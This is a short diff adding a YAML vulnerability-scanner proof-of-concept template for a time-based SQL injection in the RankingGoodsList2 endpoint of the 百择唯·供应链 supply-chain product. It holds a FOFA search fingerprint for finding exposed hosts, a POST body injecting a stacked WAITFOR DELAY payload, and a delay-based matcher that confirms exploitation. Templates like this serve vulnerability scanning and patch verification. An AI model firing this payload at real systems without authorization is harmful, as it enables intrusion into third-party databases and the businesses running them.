@@ -1,0 +1,20 @@
+id: poc-yaml-donvv-bzw-gyl-rankinggoodslist2-sqli
+info:
+  name: 懂微百择唯·供应链 RankingGoodsList2 SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 百择唯·供应链
+  fofa: body="/Content/Css/_SiteCss/"
+variables:
+  t1: random_int(4,9)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /Goods/RankingGoodsList2
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: goodsSortType=Recommend&goodsTypeList%5B%5D=1%';WAITFOR DELAY '0:0:{{.t1}}'--
+  expression: status_code == 200 && contains(body,"\"Status\":1") && contains(body,"\"Data\":")
+    && duration > t1 && duration < t2
+transport: http
